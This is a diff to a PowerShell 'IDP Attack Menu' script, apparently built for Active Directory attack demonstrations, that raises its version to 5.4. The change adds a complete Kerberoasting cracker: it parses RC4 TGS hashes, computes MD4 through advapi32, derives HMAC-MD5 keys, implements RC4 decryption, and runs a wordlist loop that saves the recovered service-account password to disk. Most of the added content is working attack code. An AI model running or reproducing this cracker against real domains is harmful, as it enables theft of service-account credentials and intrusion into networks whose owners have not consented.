@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.3.1"
+$scriptVersion = "5.4"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -674,15 +674,136 @@ try {
                                 Write-Host "  [!] hashcat error: $_" -ForegroundColor Red
                             }
                         } else {
-                            Write-Host "  [-] hashcat not found locally." -ForegroundColor Yellow
-                            Write-Host "  [*] To crack offline:" -ForegroundColor White
-                            Write-Host "    hashcat -m 13100 $idpDir\kerberoast_hashes.txt $wordlistFile" -ForegroundColor Green
+                            # --- Pure PowerShell TGS cracker (etype 23 / RC4-HMAC) ---
+                            Write-Host "  [-] hashcat not found. Using built-in PowerShell cracker..." -ForegroundColor Yellow
                             Write-Host
-                            Write-Host "  [*] Or enter the service account password if known:" -ForegroundColor White
-                            $manualPw = Read-Host "  Service account password (or Enter to skip)"
-                            if ($manualPw) {
-                                Write-Host "  [+] Password: $manualPw" -ForegroundColor Green
-                                Write-Host "  [*] In a real attack this grants access to everything the service account can reach." -ForegroundColor White
+
+                            $hashLine = (Get-Content "$idpDir\kerberoast_hashes.txt" -First 1).Trim()
+                            if ($hashLine -match '\$krb5tgs\$23\$\*[^*]+\*\$([A-Fa-f0-9]{32})\$([A-Fa-f0-9]+)') {
+                                $checksumHex = $Matches[1]
+                                $edata2Hex = $Matches[2]
+                            } else {
+                                Write-Host "  [!] Could not parse TGS hash format." -ForegroundColor Red
+                                break
+                            }
+
+                            # Hex to bytes helper
+                            function Convert-HexToBytes([string]$hex) {
+                                $bytes = New-Object byte[] ($hex.Length / 2)
+                                for ($i = 0; $i -lt $hex.Length; $i += 2) {
+                                    $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
+                                }
+                                return ,$bytes
+                            }
+
+                            # RC4 cipher
+                            function Invoke-RC4([byte[]]$key, [byte[]]$data) {
+                                $S = New-Object int[] 256
+                                for ($i = 0; $i -lt 256; $i++) { $S[$i] = $i }
+                                $j = 0
+                                for ($i = 0; $i -lt 256; $i++) {
+                                    $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
+                                    $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
+                                }
+                                $i = 0; $j = 0
+                                $result = New-Object byte[] $data.Length
+                                for ($k = 0; $k -lt $data.Length; $k++) {
+                                    $i = ($i + 1) % 256
+                                    $j = ($j + $S[$i]) % 256
+                                    $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
+                                    $result[$k] = $data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]
+                                }
+                                return ,$result
+                            }
+
+                            $checksumBytes = Convert-HexToBytes $checksumHex
+                            $edata2Bytes = Convert-HexToBytes $edata2Hex
+
+                            # Ensure MD4 type is loaded (from Step 4)
+                            Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class CryptoMD4TGS {
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptDestroyHash(IntPtr hHash);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
+    public static byte[] ComputeMD4Bytes(byte[] data) {
+        IntPtr hProv = IntPtr.Zero; IntPtr hHash = IntPtr.Zero;
+        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
+        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
+        CryptHashData(hHash, data, (uint)data.Length, 0);
+        byte[] hash = new byte[16]; uint len = 16;
+        CryptGetHashParam(hHash, 2, hash, ref len, 0);
+        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
+        return hash;
+    }
+}
+"@ -ErrorAction SilentlyContinue
+
+                            $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
+                            Write-Host "  [*] Cracking TGS (etype 23 / RC4-HMAC) with $($wordlist.Count) passwords..." -ForegroundColor White
+                            $startTime = Get-Date
+                            $crackedTGS = $null
+                            $attempts = 0
+                            $msgType = [byte[]](2,0,0,0)
+
+                            foreach ($pw in $wordlist) {
+                                $attempts++
+                                try {
+                                    # 1. NTLM hash = MD4(UTF-16LE(password))
+                                    $pwBytes = [System.Text.Encoding]::Unicode.GetBytes($pw)
+                                    $ntlm = [CryptoMD4TGS]::ComputeMD4Bytes($pwBytes)
+
+                                    # 2. K1 = HMAC-MD5(NTLM, msg_type=2)
+                                    $hmac1 = New-Object System.Security.Cryptography.HMACMD5
+                                    $hmac1.Key = $ntlm
+                                    $K1 = $hmac1.ComputeHash($msgType)
+
+                                    # 3. K3 = HMAC-MD5(K1, checksum)
+                                    $hmac3 = New-Object System.Security.Cryptography.HMACMD5
+                                    $hmac3.Key = $K1
+                                    $K3 = $hmac3.ComputeHash($checksumBytes)
+
+                                    # 4. RC4 decrypt edata2
+                                    $decrypted = Invoke-RC4 -key $K3 -data $edata2Bytes
+
+                                    # 5. Verify: HMAC-MD5(K1, decrypted[16:]) should equal decrypted[0:16]
+                                    $hmacV = New-Object System.Security.Cryptography.HMACMD5
+                                    $hmacV.Key = $K1
+                                    $plaintext = $decrypted[16..($decrypted.Length - 1)]
+                                    $expected = $hmacV.ComputeHash($plaintext)
+
+                                    $match = $true
+                                    for ($i = 0; $i -lt 16; $i++) {
+                                        if ($decrypted[$i] -ne $expected[$i]) { $match = $false; break }
+                                    }
+
+                                    if ($match) {
+                                        $crackedTGS = $pw
+                                        break
+                                    }
+                                } catch { }
+                                if ($attempts % 10 -eq 0) { Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray }
+                            }
+
+                            $elapsed = ((Get-Date) - $startTime).TotalSeconds
+                            if ($crackedTGS) {
+                                Write-Host "  [+] CRACKED! Service account password: $crackedTGS" -ForegroundColor Green
+                                Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
+                                $crackedTGS | Out-File -FilePath "$idpDir\kerberoast_cracked.txt" -Encoding ASCII
+                                Write-Host "  [+] Saved to $idpDir\kerberoast_cracked.txt" -ForegroundColor Green
+                            } else {
+                                Write-Host "  [-] Exhausted wordlist ($attempts passwords) in $([math]::Round($elapsed,2))s." -ForegroundColor Yellow
+                                Write-Host "  [*] Password not in wordlist. Try a larger dictionary." -ForegroundColor White
                             }
                         }
                     }
